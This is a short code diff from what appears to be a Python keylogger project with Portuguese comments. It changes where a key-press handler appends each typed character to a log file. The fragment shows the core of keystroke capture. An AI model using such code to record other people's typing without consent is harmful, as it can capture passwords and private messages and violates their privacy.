@@ -10,7 +10,7 @@ TECLAS_ESPECIAIS = {
 }
 
 def on_press(key):
-    with open("log.txt", "a", encoding="utf-8") as file:
+    with open("Keylogger/files/log.txt", "a", encoding="utf-8") as file:
         try:
             # Tenta tecla normal
             file.write(key.char)
